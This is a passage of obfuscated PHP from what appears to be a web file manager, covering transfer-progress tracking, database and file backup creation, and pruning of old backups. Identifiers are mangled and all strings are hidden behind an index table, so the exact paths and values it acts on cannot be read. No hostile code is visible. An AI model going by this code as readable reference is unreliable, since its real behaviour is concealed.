$õ¸íËÓ); $Œ“˜•Ô‘ = rtrim(TEMP_FILES, $¹àô…Ù‚[8]); if (substr($„¹ø™İ§, 0, strlen($Œ“˜•Ô‘)) == $Œ“˜•Ô‘) { return; } if (substr($õ¸íËÓ, 0, strlen($Œ“˜•Ô‘)) == $Œ“˜•Ô‘) { return; } $ßˆĞ›Öî =& $this->task; $ßˆĞ›Öî[$¹àô…Ù‚[1765]] = KodIO::transferType($½³÷›Ãæ, $©ÀµËğª); $this->update(); } public function updateAfter() { $•µÒı¹½ =& $_SERVER[Î‹ÃÂŞ„]; $¦œƒÜáº =& $this->task; if (!$¦œƒÜáº[$•µÒı¹½[810]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¦œƒÜáº[$•µÒı¹½[1765]] == $•µÒı¹½[1370]) { return; } self::updateTask($¦œƒÜáº); } private static function updateTask(&$û­·šÒ) { $Ïí÷ğñ =& $_SERVER[Î‹ÃÂŞ„]; if ($û­·šÒ[$Ïí÷ğñ[1765]] == $Ïí÷ğñ[1249] || $û­·šÒ[$Ïí÷ğñ[1765]] == $Ïí÷ğñ[109]) { if ($û­·šÒ[$Ïí÷ğñ[1759]]) { $û­·šÒ[$Ïí÷ğñ[1762]] = $û­·šÒ[$Ïí÷ğñ[1761]] + $û­·šÒ[$Ïí÷ğñ[1758]]; } } else { if ($û­·šÒ[$Ïí÷ğñ[1765]] == $Ïí÷ğñ[1371]) { if ($û­·šÒ[$Ïí÷ğñ[1759]] == $Ïí÷ğñ[1249]) { $û­·šÒ[$Ïí÷ğñ[1762]] = $û­·šÒ[$Ïí÷ğñ[1761]] + $û­·šÒ[$Ïí÷ğñ[1758]] * 0.5; } else { if ($û­·šÒ[$Ïí÷ğñ[1759]] == $Ïí÷ğñ[109]) { $û­·šÒ[$Ïí÷ğñ[1762]] = $û­·šÒ[$Ïí÷ğñ[1761]] + $û­·šÒ[$Ïí÷ğñ[1757]] * 0.5 + $û­·šÒ[$Ïí÷ğñ[1758]] * 0.5; } } } } $û­·šÒ[$Ïí÷ğñ[1706]] = $û­·šÒ[$Ïí÷ğñ[1762]] / $û­·šÒ[$Ïí÷ğñ[810]]; if ($û­·šÒ[$Ïí÷ğñ[1706]] > 0) { $öËŒÁø¯ = timeFloat() - $û­·šÒ[$Ïí÷ğñ[1708]] - $û­·šÒ[$Ïí÷ğñ[1711]]; $û­·šÒ[$Ïí÷ğñ[1712]] = $öËŒÁø¯ * (1 - $û­·šÒ[$Ïí÷ğñ[1706]]) / $û­·šÒ[$Ïí÷ğñ[1706]]; } } public function addPath($áÙ°) { $§ñë‘ñú =& $_SERVER[Î‹ÃÂŞ„]; if (!$áÙ°) { return; } $ôÓøõŞ­ =& $this->task; $à£ßÇí = IO::infoWithChildren($áÙ°); $°ÎİÎÈÕ = $ôÓøõŞ­[$§ñë‘ñú[1766]] ? $ôÓøõŞ­[$§ñë‘ñú[1766]][$§ñë‘ñú[1767]] : 0; $ôÓøõŞ­[$§ñë‘ñú[1766]] = array($§ñë‘ñú[1767] => $°ÎİÎÈÕ + 1, $§ñë‘ñú[464] => $à£ßÇí[$§ñë‘ñú[32]], $§ñë‘ñú[86] => $à£ßÇí[$§ñë‘ñú[86]], $§ñë‘ñú[554] => $à£ßÇí[$§ñë‘ñú[554]] ? $à£ßÇí[$§ñë‘ñú[554]] : $à£ßÇí[$§ñë‘ñú[86]]); if ($à£ßÇí[$§ñë‘ñú[33]] == $§ñë‘ñú[216]) { $ôÓøõŞ­[$§ñë‘ñú[833]] += 1; } else { $ôÓøõŞ­[$§ñë‘ñú[833]] += $à£ßÇí[$§ñë‘ñú[81]][$§ñë‘ñú[79]]; if ($à£ßÇí[$§ñë‘ñú[183]]) { $ôÓøõŞ­[$§ñë‘ñú[833]] += $à£ßÇí[$§ñë‘ñú[81]][$§ñë‘ñú[80]] + 1; } } $ôÓøõŞ­[$§ñë‘ñú[810]] += $à£ßÇí[$§ñë‘ñú[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($à…¥) { } public function sourceAddHashEnd($Ì„Êûç) { } public function sourceAddFileStart($üâÎãÓÔ) { $ùöµ°ãÙ =& $_SERVER[Î‹ÃÂŞ„]; $†³Íìê =& $this->task; $†³Íìê[$ùöµ°ãÙ[1757]] = $üâÎãÓÔ[$ùöµ°ãÙ[78]]; $†³Íìê[$ùöµ°ãÙ[1755]] = $üâÎãÓÔ[$ùöµ°ãÙ[32]]; $†³Íìê[$ùöµ°ãÙ[1119]] = $üâÎãÓÔ[$ùöµ°ãÙ[32]]; $†³Íìê[$ùöµ°ãÙ[1768]] = $üâÎãÓÔ[$ùöµ°ãÙ[86]]; $this->update(); } public function sourceAddFileEnd($Ù‚ğ†¶ê) { $‚Óõø‘» =& $_SERVER[Î‹ÃÂŞ„]; $Ç‚­—²º =& $this->task; $Ç‚­—²º[$‚Óõø‘»[1762]] += $Ù‚ğ†¶ê[$‚Óõø‘»[78]]; $Ç‚­—²º[$‚Óõø‘»[1768]] = $Ù‚ğ†¶ê[$‚Óõø‘»[86]]; $this->update(1); } public function copyFileStart($«†‡¥üÉ, $¡¨®Ô¨Ì, $éŞì”Ü˜, $­ç•ø½, $ÊÀº¾†ª, $®´‰ÀÄ¸) { $òÍúøÑÉ =& $_SERVER[Î‹ÃÂŞ„]; $¥À¹åŸ = $ÊÀº¾†ª; if ($¥À¹åŸ == $GLOBALS[$òÍúøÑÉ[1769]]) { $¥À¹åŸ = $GLOBALS[$òÍúøÑÉ[1770]]; } $GLOBALS[$òÍúøÑÉ[1770]] = $ÊÀº¾†ª; $GLOBALS[$òÍúøÑÉ[1769]] = $®´‰ÀÄ¸; $í·©İ†ç =& $this->task; $í·©İ†ç[$òÍúøÑÉ[1755]] = $¥À¹åŸ; $í·©İ†ç[$òÍúøÑÉ[1757]] = (int) $«†‡¥üÉ->size($¡¨®Ô¨Ì); $í·©İ†ç[$òÍúøÑÉ[1758]] = 0; $í·©İ†ç[$òÍúøÑÉ[1119]] = $òÍúøÑÉ[12]; $í·©İ†ç[$òÍúøÑÉ[1759]] = $òÍúøÑÉ[12]; $í·©İ†ç[$òÍúøÑÉ[1760]] = 0; $ù‰İúó = $í·©İ†ç[$òÍúøÑÉ[1757]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($í·©İ†ç[$òÍúøÑÉ[445]] . $òÍúøÑÉ[1771]); if ($ù‰İúó && file_exists(get_path_father($­ç•ø½))) { Cache::set($í·©İ†ç[$òÍúøÑÉ[445]] . $òÍúøÑÉ[1771], $­ç•ø½); $í·©İ†ç[$òÍúøÑÉ[1728]] = array($òÍúøÑÉ[1772], $òÍúøÑÉ[1773]); } $this->update(0, $ù‰İúó); } public static function updateCopyLocalFileSize($Û‡¶øØ™) { $Àçñãç€ =& $_SERVER[Î‹ÃÂŞ„]; $®¨ÑÕåª = Cache::get($Û‡¶øØ™[$Àçñãç€[445]] . $Àçñãç€[1771]); if (!$®¨ÑÕåª || !file_exists($®¨ÑÕåª)) { return $Û‡¶øØ™; } $Û‡¶øØ™[$Àçñãç€[1758]] = @filesize($®¨ÑÕåª); $Û‡¶øØ™[$Àçñãç€[1762]] += $Û‡¶øØ™[$Àçñãç€[1758]]; self::updateTask($Û‡¶øØ™); return $Û‡¶øØ™; } public function copyFileEnd($…áèà»Ò, $ùšÛÓ„, $ÀÅÓ¤˜¼, $ÎöõÍÄ, $Î«ã¿•¶, $Ä•‡Üßû) { $ôæŞ › =& $_SERVER[Î‹ÃÂŞ„]; $´ƒ÷äı– =& $this->task; $´ƒ÷äı–[$ôæŞ ›[1758]] = $´ƒ÷äı–[$ôæŞ ›[1757]]; $´ƒ÷äı–[$ôæŞ ›[1759]] = $ôæŞ ›[12]; unset($´ƒ÷äı–[$ôæŞ ›[1728]]); if ($Î«ã¿•¶ == $´ƒ÷äı–[$ôæŞ ›[1755]]) { $´ƒ÷äı–[$ôæŞ ›[1761]] += $´ƒ÷äı–[$ôæŞ ›[1757]]; $´ƒ÷äı–[$ôæŞ ›[1762]] = $´ƒ÷äı–[$ôæŞ ›[1761]]; $´²ÁÚìŸ = 1; if (isset($´ƒ÷äı–[$ôæŞ ›[1768]]) && $´ƒ÷äı–[$ôæŞ ›[1768]] == $ùšÛÓ„) { $´²ÁÚìŸ = 0; } $this->update($´²ÁÚìŸ); } else { $this->update(); $´ƒ÷äı–[$ôæŞ ›[1758]] = 0; } Cache::remove($´ƒ÷äı–[$ôæŞ ›[445]] . $ôæŞ ›[1771]); self::log($ôæŞ ›[1774] . $ùšÛÓ„ . $ôæŞ ›[72] . $ÎöõÍÄ . $ôæŞ ›[248] . $Î«ã¿•¶ . $ôæŞ ›[1775] . $´ƒ÷äı–[$ôæŞ ›[1755]]); } public function updateFileEnd($Ê»Ê§½é, $íà‘ç´ß) { $¶ÆùÇœ£ =& $_SERVER[Î‹ÃÂŞ„]; $‰²é¨Šò =& $this->task; $‰²é¨Šò[$¶ÆùÇœ£[1755]] = $Ê»Ê§½é; $‰²é¨Šò[$¶ÆùÇœ£[1757]] = $íà‘ç´ß; $‰²é¨Šò[$¶ÆùÇœ£[1761]] += $íà‘ç´ß; $‰²é¨Šò[$¶ÆùÇœ£[1762]] = $‰²é¨Šò[$¶ÆùÇœ£[1761]]; $this->update(1); self::log($¶ÆùÇœ£[1776] . $Ê»Ê§½é); } public function sourceModelCopy($ì¶¹ßÆ­) { $öŞäÔ“¼ =& $_SERVER[Î‹ÃÂŞ„]; $´·ˆ†¶¡ = $ì¶¹ßÆ­[0]; $êüŠç›ò = $ì¶¹ßÆ­[1]; $‰¶²¶ñ† =& $this->task; $this->sourceModelCopyFlag = !0; $­›éÉßú = 0; switch ($´·ˆ†¶¡) { case $öŞäÔ“¼[606]: $­›éÉßú = 1; break; case $öŞäÔ“¼[609]: $‰¶²¶ñ†[$öŞäÔ“¼[1755]] = $êüŠç›ò[$öŞäÔ“¼[32]]; break; case $öŞäÔ“¼[611]: $­›éÉßú = intval($ì¶¹ßÆ­[$öŞäÔ“¼[426]] * 0.4); break; case $öŞäÔ“¼[613]: $­›éÉßú = intval($ì¶¹ßÆ­[$öŞäÔ“¼[426]] * 0.2); break; case $öŞäÔ“¼[615]: $­›éÉßú = intval($ì¶¹ßÆ­[$öŞäÔ“¼[426]] * 0.4); break; } $this->update($­›éÉßú); $this->sourceModelCopyFlag = !1; } public function sourceRemove($íÛâôº, $™–•¹¬ì) { $ŞÖîÇı =& $_SERVER[Î‹ÃÂŞ„]; $this->sourceModelCopyFlag = !0; $²êİ—àÆ = 1; if (isset($íÛâôº[$ŞÖîÇı[81]])) { $²êİ—àÆ = $íÛâôº[$ŞÖîÇı[81]][$ŞÖîÇı[79]]; $²êİ—àÆ = $²êİ—àÆ + $íÛâôº[$ŞÖîÇı[81]][$ŞÖîÇı[80]] + 1; } $this->update($²êİ—àÆ); $this->sourceModelCopyFlag = !1; } public function sourceMove($¯»Š•©Â) { $this->sourceRemove($¯»Š•©Â, !1); } public function curlProgress($ÁØ†áò×, $İ É½…, $½ ûâÜ, $ËÉ›, $”µıûøÓ) { $’¸ÅÚ¼ò =& $_SERVER[Î‹ÃÂŞ„]; $Î†ã Àê =& $this->task; if ($”µıûøÓ > 0) { $Î†ã Àê[$’¸ÅÚ¼ò[1119]] = $’¸ÅÚ¼ò[1777]; $Î†ã Àê[$’¸ÅÚ¼ò[1759]] = $’¸ÅÚ¼ò[109]; if ($Î†ã Àê[$’¸ÅÚ¼ò[1757]]) { $Î†ã Àê[$’¸ÅÚ¼ò[1758]] = $”µıûøÓ; } if ($Î†ã Àê[$’¸ÅÚ¼ò[1760]]) { $Î†ã Àê[$’¸ÅÚ¼ò[1758]] = $”µıûøÓ + $Î†ã Àê[$’¸ÅÚ¼ò[1760]]; } } else { if ($½ ûâÜ > 0) { if ($Î†ã Àê[$’¸ÅÚ¼ò[1757]] == $İ É½…) { $Î†ã Àê[$’¸ÅÚ¼ò[1758]] = $½ ûâÜ; $Î†ã Àê[$’¸ÅÚ¼ò[1119]] = $’¸ÅÚ¼ò[1778]; $Î†ã Àê[$’¸ÅÚ¼ò[1759]] = $’¸ÅÚ¼ò[1249]; } } } $this->update(); } public function curlProgressStart($¤£‰˜«º) { } public function curlProgressEnd($ù“Îü¸€) { $¢“ºæ…ó =& $_SERVER[Î‹ÃÂŞ„]; $¯Ô¡¯Òï =& $this->task; $²ş¢ø‰ = curl_getinfo($ù“Îü¸€); $ó›£¤Íø = $²ş¢ø‰[$¢“ºæ…ó[1779]]; if ($ó›£¤Íø == -1) { $ó›£¤Íø = $²ş¢ø‰[$¢“ºæ…ó[1780]]; } if ($¯Ô¡¯Òï[$¢“ºæ…ó[1759]] == $¢“ºæ…ó[109] && $ó›£¤Íø) { $¯Ô¡¯Òï[$¢“ºæ…ó[1760]] += $ó›£¤Íø; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÑªŸ›å =& $_SERVER[Î‹ÃÂŞ„]; $ˆ„ô™’Î =& $this->task; $ˆ„ô™’Î[$ÑªŸ›å[1781]] = 1; Hook::bind($ÑªŸ›å[1749], array($this, $ÑªŸ›å[1782])); Hook::bind($ÑªŸ›å[1751], array($this, $ÑªŸ›å[1783])); Hook::bind($ÑªŸ›å[1753], array($this, $ÑªŸ›å[1784])); } protected function endAfter() { $îÏÜ¥ƒû =& $_SERVER[Î‹ÃÂŞ„]; Hook::unbind($îÏÜ¥ƒû[1749], array($this, $îÏÜ¥ƒû[1782])); Hook::unbind($îÏÜ¥ƒû[1751], array($this, $îÏÜ¥ƒû[1783])); Hook::unbind($îÏÜ¥ƒû[1753], array($this, $îÏÜ¥ƒû[1784])); } public function progressStart($ŒĞìµË‹) { $»¥›¿„å =& $_SERVER[Î‹ÃÂŞ„]; $†îÊ‘›² = curl_getinfo($ŒĞìµË‹); self::log($»¥›¿„å[1785] . $†îÊ‘›²[$»¥›¿„å[353]]); self::valueSet($this->task[$»¥›¿„å[445]], $this->task); } public function progressEnd($‰ÛÏÃÚÄ) { $´˜ĞÒ‡ =& $_SERVER[Î‹ÃÂŞ„]; self::log($´˜ĞÒ‡[1786] . $this->task[$´˜ĞÒ‡[445]]); $this->end(); } public function progress($ï£ĞŒóå, $ŸÙéÖõ², $ÉÒÉ²§, $ËµÃçœğ, $¾ËŠáİã) { $›×«…“° =& $_SERVER[Î‹ÃÂŞ„]; $Á‘»ÀŒË =& $this->task; if ($¾ËŠáİã > 0) { $Á‘»ÀŒË[$›×«…“°[833]] = $Á‘»ÀŒË[$›×«…“°[833]] == 0 ? $ËµÃçœğ : $Á‘»ÀŒË[$›×«…“°[833]]; $Á‘»ÀŒË[$›×«…“°[1705]] = $¾ËŠáİã; } else { if ($ÉÒÉ²§ > 0) { $Á‘»ÀŒË[$›×«…“°[833]] = $Á‘»ÀŒË[$›×«…“°[833]] == 0 ? $ŸÙéÖõ² : $Á‘»ÀŒË[$›×«…“°[833]]; $Á‘»ÀŒË[$›×«…“°[1705]] = $ÉÒÉ²§; } } $this->update(); self::log("\x70\x72\157\x67\162\x65\x73\x73\110\164\x74\160\x3a\x64\x6f\x77\156\x3a{$ÉÒÉ²§}\x2f{$ŸÙéÖõ²}\73\40\165\x70\154\x6f\x61\144\72{$¾ËŠáİã}\x2f{$ËµÃçœğ}\73"); } } goto f¡§ê²”­; b—Ö»ÉÔê: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Ğ†Ã€ =& $_SERVER[Î‹ÃÂŞ„]; $this->isManual(); self::$name = date($Ğ†Ã€[795]); if (!($ßÛŒú = Model($Ğ†Ã€[796])->lastItem())) { $ßÛŒú = $this->initData(); } else { self::$name = $ßÛŒú[$Ğ†Ã€[32]]; if ($ßÛŒú[$Ğ†Ã€[797]] == $Ğ†Ã€[90]) { self::$name = date($Ğ†Ã€[257]); $ı‡Â¤¤ = 0; if (isset($ßÛŒú[$Ğ†Ã€[339]][$Ğ†Ã€[216]][$Ğ†Ã€[511]])) { $ı‡Â¤¤ = (int) $ßÛŒú[$Ğ†Ã€[339]][$Ğ†Ã€[216]][$Ğ†Ã€[511]]; } if (self::$manual == 0 && $ßÛŒú[$Ğ†Ã€[32]] == self::$name) { Model($Ğ†Ã€[796])->remove($ßÛŒú[$Ğ†Ã€[445]]); } $ßÛŒú = $this->initData($ı‡Â¤¤, $ßÛŒú[$Ğ†Ã€[798]]); } else { $this->checkStore($ßÛŒú[$Ğ†Ã€[798]]); } } self::$option = $ßÛŒú; } private function isManual() { $¾’ßªã’ = _get($GLOBALS, $_SERVER[Î‹ÃÂŞ„][799], 0); $¾’ßªã’ = intval($¾’ßªã’); self::$manual = $¾’ßªã’ && $¾’ßªã’ == 1 ? 1 : 0; } private function initData($šÉÉİÂº = 0, $¾œ¢›ºï = '') { $¼ç£åìë =& $_SERVER[Î‹ÃÂŞ„]; $¡ÛõÜ = Model($¼ç£åìë[796])->config(); if ($¾œ¢›ºï && $¡ÛõÜ[$¼ç£åìë[798]] != $¾œ¢›ºï) { $šÉÉİÂº = 0; } $this->checkStore($¡ÛõÜ[$¼ç£åìë[798]]); if (self::$manual == 1) { self::$name .= $¼ç£åìë[11] . date($¼ç£åìë[800]); } $†çäŠŒâ = array($¼ç£åìë[798] => $¡ÛõÜ[$¼ç£åìë[798]], $¼ç£åìë[32] => self::$name, $¼ç£åìë[797] => 0, $¼ç£åìë[801] => $¡ÛõÜ[$¼ç£åìë[801]], $¼ç£åìë[802] => self::$manual, $¼ç£åìë[339] => array($¼ç£åìë[803] => array($¼ç£åìë[797] => 0), $¼ç£åìë[804] => array($¼ç£åìë[797] => 0, $¼ç£åìë[805] => 0, $¼ç£åìë[806] => 0, $¼ç£åìë[33] => $¼ç£åìë[12], $¼ç£åìë[807] => 0, $¼ç£åìë[808] => 0), $¼ç£åìë[809] => array($¼ç£åìë[797] => 0, $¼ç£åìë[805] => 0, $¼ç£åìë[806] => 0, $¼ç£åìë[807] => 0, $¼ç£åìë[808] => 0), $¼ç£åìë[216] => array($¼ç£åìë[797] => 0, $¼ç£åìë[810] => 0, $¼ç£åìë[811] => 0, $¼ç£åìë[812] => 0, $¼ç£åìë[813] => 0, $¼ç£åìë[511] => $šÉÉİÂº, $¼ç£åìë[807] => 0, $¼ç£åìë[808] => 0)), $¼ç£åìë[807] => time(), $¼ç£åìë[808] => 0); $‡öÜÈ¥ = Model($¼ç£åìë[796])->insert($†çäŠŒâ); $†çäŠŒâ[$¼ç£åìë[445]] = $‡öÜÈ¥; return $†çäŠŒâ; } private function checkStore($‰øÚ ‘Š) { $ş»ğÌµ =& $_SERVER[Î‹ÃÂŞ„]; $ËÉ´á¡ = Model($ş»ğÌµ[814])->listData($‰øÚ ‘Š); Model($ş»ğÌµ[814])->checkConfig($ËÉ´á¡); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Î‹ÃÂŞ„][796])->findByName(self::$name); } return self::$option; } public static function set($„Ë ¡¦ä) { $…õâĞ“¹ =& $_SERVER[Î‹ÃÂŞ„]; $é€êá¨é = self::get(); foreach ($„Ë ¡¦ä as $Ã®Úê´Ò => $«™¿Ï›ò) { $µ£ Şè† = explode($…õâĞ“¹[10], $Ã®Úê´Ò); $°™Ó’•˜ = count($µ£ Şè†); switch ($°™Ó’•˜) { case 1: $é€êá¨é[$µ£ Şè†[0]] = $«™¿Ï›ò; break; case 2: $é€êá¨é[$µ£ Şè†[0]][$µ£ Şè†[1]] = $«™¿Ï›ò; break; case 3: $é€êá¨é[$µ£ Şè†[0]][$µ£ Şè†[1]][$µ£ Şè†[2]] = $«™¿Ï›ò; break; } } Model($…õâĞ“¹[796])->update($é€êá¨é[$…õâĞ“¹[445]], $é€êá¨é); self::$option = $é€êá¨é; return self::$option; } public function keep() { $“””±Î„ =& $_SERVER[Î‹ÃÂŞ„]; $¯ƒåÛÛ÷ = self::get(); if ($¯ƒåÛÛ÷[$“””±Î„[339]][$“””±Î„[803]][$“””±Î„[797]] == $“””±Î„[90]) { return; } $this->backupKeep($¯ƒåÛÛ÷); self::set(array($“””±Î„[815] => 1)); } private function backupKeep($Šûà›†´) { $ö÷Â÷âë =& $_SERVER[Î‹ÃÂŞ„]; if (self::$manual == 1) { return; } $šıÇÎû = Model($ö÷Â÷âë[796])->listData(); if (empty($šıÇÎû)) { return; } $ğç©Ÿ€Õ = 0; $îÊ¦ØÖ = array(); foreach ($šıÇÎû as $ĞƒÜ¬ø) { if ($ğç©Ÿ€Õ >= 7) { break; } $îÊ¦ØÖ[] = $ĞƒÜ¬ø[$ö÷Â÷âë[32]]; $ğç©Ÿ€Õ++; } for ($ğç©Ÿ€Õ = 0; $ğç©Ÿ€Õ < 12; $ğç©Ÿ€Õ++) { $îÊ¦ØÖ[] = date($ö÷Â÷âë[816], strtotime("\x2d{$ğç©Ÿ€Õ}\x20\x6d\157\x6e\164\x68\163")); } $îÊ¦ØÖ = array_unique($îÊ¦ØÖ); $©Ñ·Ô® = Model($ö÷Â÷âë[817])->get($ö÷Â÷âë[818]); foreach ($šıÇÎû as $ĞƒÜ¬ø) { if (isset($ĞƒÜ¬ø[$ö÷Â÷âë[802]]) && $ĞƒÜ¬ø[$ö÷Â÷âë[802]] == $ö÷Â÷âë[90]) { continue; } if (!empty($ĞƒÜ¬ø[$ö÷Â÷âë[32]]) && in_array($ĞƒÜ¬ø[$ö÷Â÷âë[32]], $îÊ¦ØÖ)) { continue; } Model($ö÷Â÷âë[796])->remove($ĞƒÜ¬ø[$ö÷Â÷âë[445]]); $ñ†Äúëì = $this->backupPath($Šûà›†´, $©Ñ·Ô®); IO::remove($ñ†Äúëì, !1); } } private function backupPath($¹ã¶÷î, $ô§àÎî° = false) { $ºÒÉñè³ =& $_SERVER[Î‹ÃÂŞ„]; if (!$ô§àÎî°) { $ô§àÎî° = Model($ºÒÉñè³[817])->get($ºÒÉñè³[818]); } $¹Ë·Î– = $¹ã¶÷î[$ºÒÉñè³[32]]; $¹ƒ¡££¸ = substr(md5($ºÒÉñè³[819] . $ô§àÎî° . $¹Ë·Î–), 0, 8); return "\173\x69\157\72{$¹ã¶÷î[$ºÒÉñè³[798]]}\175\57\144\141\164\141\142\141\163\145\57\142\x61\x63\x6b\x75\160\57" . $¹Ë·Î– . $ºÒÉñè³[11] . $¹ƒ¡££¸; } public function db() { $ ¡æÌäÇ =& $_SERVER[Î‹ÃÂŞ„]; $¹¢ƒŸàÊ = self::get(); if ($¹¢ƒŸàÊ[$ ¡æÌäÇ[339]][$ ¡æÌäÇ[804]][$ ¡æÌäÇ[797]] == $ ¡æÌäÇ[90]) { return !0; } $¶ü¼ì = new BackupDb(); if (!$¶ü¼ì->index()) { return !1; } self::set(array($ ¡æÌäÇ[820] => 1)); return !0; } public function dbFile() { $ˆ¹ü´Ë” =& $_SERVER[Î‹ÃÂŞ„]; $ûÉóÂã© = self::get(); if ($ûÉóÂã©[$ˆ¹ü´Ë”[339]][$ˆ¹ü´Ë”[809]][$ˆ¹ü´Ë”[797]] == $ˆ¹ü´Ë”[90]) { return !0; } $®ÙÀ¥— = new BackupDbFile(); if (!$®ÙÀ¥—->index()) { return !1; } self::set(array($ˆ¹ü´Ë”[821] => 1)); return !0; } public function file() { $ÎÇàÆ´ë =& $_SERVER[Î‹ÃÂŞ„]; $¨È˜ò = self::get(); if ($¨È˜ò[$ÎÇàÆ´ë[339]][$ÎÇàÆ´ë[216]][$ÎÇàÆ´ë[797]] == $ÎÇàÆ´ë[90]) { return !0; } if (!isset($¨È˜ò[$ÎÇàÆ´ë[801]]) || $¨È˜ò[$ÎÇàÆ´ë[801]] == $ÎÇàÆ´ë[214]) { $«½À¨Ÿò = new BackupFile(); if (!$«½À¨Ÿò->index()) { return !1; } } self::set(array($ÎÇàÆ´ë[822] => 1, $ÎÇàÆ´ë[797] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $÷¡¸ŞŞ— =& $_SERVER[Î‹ÃÂŞ„]; $™Ì³½¨» = Backup::get(); self::$io = $™Ì³½¨»[$÷¡¸ŞŞ—[798]]; self::$name = $™Ì³½¨»[$÷¡¸ŞŞ—[32]]; $À®‚ÇÙı = new DbManage(); $†ºö€Â› = $À®‚ÇÙı->dbType(); $¥çÈà“Å = array($÷¡¸ŞŞ—[823] => $†ºö€Â›, $÷¡¸ŞŞ—[824] => time()); Backup::set($¥çÈà“Å); $¶äûŸŒ = $this->tmpFilesPath() . $÷¡¸ŞŞ—[825] . self::$name . $÷¡¸ŞŞ—[8]; del_dir($¶äûŸŒ); mk_dir($¶äûŸŒ); $ä¡‹«ş» = $±½ç…’û = 0; $‰ó‘Ó³¸ = new Task($÷¡¸ŞŞ—[826], $÷¡¸ŞŞ—[827], 0, LNG($÷¡¸ŞŞ—[828]) . $÷¡¸ŞŞ—[829] . LNG($÷¡¸ŞŞ—[830])); try { $¦‚¶Ö ë = $À®‚ÇÙı->db()->getTables(); } catch (Exception $ÖÂÊ£×ˆ) { $‰ó‘Ó³¸->end(); return !1; } $¦‚¶Ö ë = array_diff($¦‚¶Ö ë, array($÷¡¸ŞŞ—[831], $÷¡¸ŞŞ—[832])); foreach ($¦‚¶Ö ë as $ÓøÇÀšï) { $ä¡‹«ş» += $À®‚ÇÙı->model($ÓøÇÀšï)->count(); } $‰ó‘Ó³¸->task[$÷¡¸ŞŞ—[833]] = $ä¡‹«ş»; $GLOBALS[$÷¡¸ŞŞ—[834]] = self::$name; foreach ($¦‚¶Ö ë as $ÓøÇÀšï) { $á°÷”· = $¶äûŸŒ . $ÓøÇÀšï . $÷¡¸ŞŞ—[835]; $Ï”š°×ø = null; if ($ÓøÇÀšï == $÷¡¸ŞŞ—[836] && (!isset($™Ì³½¨»[$÷¡¸ŞŞ—[801]]) || $™Ì³½¨»[$÷¡¸ŞŞ—[801]] == $÷¡¸ŞŞ—[214])) { $Ï”š°×ø = self::$io; } $±½ç…’û += $À®‚ÇÙı->sqlFromDb($ÓøÇÀšï, $á°÷”·, $‰ó‘Ó³¸, $Ï”š°×ø); } unset($GLOBALS[$÷¡¸ŞŞ—[834]]); $‰ó‘Ó³¸->end(); if ($±½ç…’û > $ä¡‹«ş») { $ä¡‹«ş» = $±½ç…’û; } $¥çÈà“Å = array($÷¡¸ŞŞ—[823] => $†ºö€Â›, $÷¡¸ŞŞ—[820] => 1, $÷¡¸ŞŞ—[837] => $ä¡‹«ş», $÷¡¸ŞŞ—[838] => $±½ç…’û, $÷¡¸ŞŞ—[839] => time()); Backup::set($¥çÈà“Å); if ($ä¡‹«ş» - $±½ç…’û > 0) { $ÙµØôÚğ = $÷¡¸ŞŞ—[840]; if (stristr(I18n::getType(), $÷¡¸ŞŞ—[841])) { $ÙµØôÚğ = $÷¡¸ŞŞ—[842]; } write_log(array($ÙµØôÚğ, $¥çÈà“Å), $÷¡¸ŞŞ—[827]); return !1; } return !0; } private function tmpFilesPath() { $ûøêîìÓ =& $_SERVER[Î‹ÃÂŞ„]; $°ÓñÇ¦˜ = TEMP_FILES; if ($GLOBALS[$ûøêîìÓ[6]][$ûøêîìÓ[91]][$ûøêîìÓ[843]]) { $°ÓñÇ¦˜ = $GLOBALS[$ûøêîìÓ[6]][$ûøêîìÓ[91]][$ûøêîìÓ[843]]; if (!mk_dir($°ÓñÇ¦˜) || !is_writable($°ÓñÇ¦˜) || !IO::mkfile($°ÓñÇ¦˜ . $ûøêîìÓ[844])) { $°ÓñÇ¦˜ = TEMP_FILES; } } return $°ÓñÇ¦˜; } } class BackupDbFile { public function __construct() { } public function index() { $òéƒ¯š† =& $_SERVER[Î‹ÃÂŞ„]; $Òúí§ùî = Backup::get(); $öô™¦¤à = $Òúí§ùî[$òéƒ¯š†[32]]; $×ÒÆ±œ = $this->tmpFilesPath() . "\142\141\143\153\x75\x70\137{$öô™¦¤à}\57"; $Ğ¹‚„™Ù = $this->backupPath($Òúí§ùî); if (!($Ğ¹‚„™Ù = IO::mkdir($Ğ¹‚„™Ù))) { return !1; } $ÜßÆïåå = IO::listPath($×ÒÆ±œ); $°˜×•—Ü = isset($ÜßÆïåå[$òéƒ¯š†[85]]) ? $ÜßÆïåå[$òéƒ¯š†[85]] : array(); $Ìˆƒ¿Õ = array_sum(array_column($°˜×•—Ü, $òéƒ¯š†[78])); if (!$Ìˆƒ¿Õ) { return !1; } $è°µÏ = array($òéƒ¯š†[845] => $Ìˆƒ¿Õ, $òéƒ¯š†[846] => time()); Backup::set($è°µÏ); $ÃÀ½õ°ê = new TaskFileTransfer($òéƒ¯š†[847], $òéƒ¯š†[827], count($°˜×•—Ü), LNG($òéƒ¯š†[828]) . $òéƒ¯š†[432] . LNG($òéƒ¯š†[830]) . $òéƒ¯š†[848]); $ÃÀ½õ°ê->task[$òéƒ¯š†[810]] = $Ìˆƒ¿Õ; foreach ($ÜßÆïåå[$òéƒ¯š†[85]] as $š‹‡ÒƒÏ) { $èà‰÷™‹ = IO::move($š‹‡ÒƒÏ[$òéƒ¯š†[86]], $Ğ¹‚„™Ù); if (!$èà‰÷™‹) { $ÃÀ½õ°ê->end(); $ÖˆùÔæØ = IO::getLastError($òéƒ¯š†[849] . $š‹‡ÒƒÏ[$òéƒ¯š†[86]] . $òéƒ¯š†[850] . $Ğ¹‚„™Ù . $òéƒ¯š†[167]); write_log($ÖˆùÔæØ, $òéƒ¯š†[827]); return !1; } } $¥ÈçÉ’Ê = new DbManage(); $ô·ø›øâ = $¥ÈçÉ’Ê->getSqlFile(); if (!$ô·ø›øâ[$òéƒ¯š†[851]] || !$ô·ø›øâ[$òéƒ¯š†[13]]) { return !1; } 